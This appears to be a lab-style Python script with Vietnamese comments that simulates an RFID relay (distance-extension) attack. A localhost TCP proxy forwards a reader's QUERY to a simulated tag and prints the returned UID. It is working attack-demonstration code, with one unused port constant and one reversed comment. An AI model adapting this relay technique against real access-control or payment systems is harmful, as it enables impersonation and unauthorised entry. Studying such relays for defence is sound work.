#!/usr/bin/env python3
"""RFID Relay Attack — proxy 2 kết nối giữa tag và reader để kéo dài khoảng cách"""
import socket, json, time, threading
from colorama import Fore, init
init(autoreset=True)

PROXY_PORT_READER = 6101  # Proxy nhận từ reader
PROXY_PORT_TAG    = 6102  # Proxy gửi tới tag
TAG_HOST, TAG_PORT = '127.0.0.1', 6001  # Thẻ thực

relayed_data = []
relay_active = False

def relay_tag_to_reader(proxy_sock, addr):
    """Nhận từ tag thực, gửi tới reader"""
    try:
        tag_sock = socket.socket()
        tag_sock.settimeout(3)
        tag_sock.connect((TAG_HOST, TAG_PORT))
        
        # Chuyển tiếp dữ liệu 2 chiều
        req = proxy_sock.recv(512)
        if req:
            tag_sock.send(req)
            resp = tag_sock.recv(512)
            proxy_sock.send(resp)
            relayed_data.append({
                'ts': time.time(),
                'from': 'reader',
                'req': json.loads(req.decode()).get('cmd','?'),
                'resp': resp.decode()[:80]
            })
        tag_sock.close()
    except Exception as e:
        print(f'{Fore.RED}[RELAY] Error: {e}')
    finally:
        proxy_sock.close()

class RelayProxy:
    def __init__(self):
        self.server = socket.socket()
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(('127.0.0.1', PROXY_PORT_READER))
        self.server.listen(10)
        print(f'{Fore.CYAN}[RELAY] Proxy listening on port {PROXY_PORT_READER}')
        print(f'{Fore.CYAN}[RELAY] Forwarding to {TAG_HOST}:{TAG_PORT}')
        print(f'{Fore.RED}[RELAY] ⚠ This allows distance extension attacks!')
        
    def run(self):
        while relay_active:
            try:
                proxy_sock, addr = self.server.accept()
                print(f'{Fore.YELLOW}[RELAY] Reader connected from {addr}')
                threading.Thread(target=relay_tag_to_reader,
                                args=(proxy_sock, addr), daemon=True).start()
            except:
                break

print(f'{Fore.RED}=== RFID Relay Attack (Distance Extension) ===')
print(f'{Fore.RED}Attacker tại vị trí A với proxy:6101')
print(f'{Fore.RED}Thẻ tại vị trí B (có proxy:6102)\n')

relay_active = True
relay = RelayProxy()
threading.Thread(target=relay.run, daemon=True).start()

# Mô phỏng: reader kết nối qua proxy
time.sleep(2)
try:
    s = socket.socket()
    s.settimeout(2)
    s.connect(('127.0.0.1', PROXY_PORT_READER))
    s.send(json.dumps({'cmd':'QUERY'}).encode())
    resp = json.loads(s.recv(512).decode())
    s.close()
    print(f'{Fore.GREEN}[RELAY] Relayed response: UID={resp.get("uid","?")}')
except Exception as e:
    print(f'{Fore.RED}[RELAY] Connection failed: {e}')

relay_active = False
time.sleep(1)
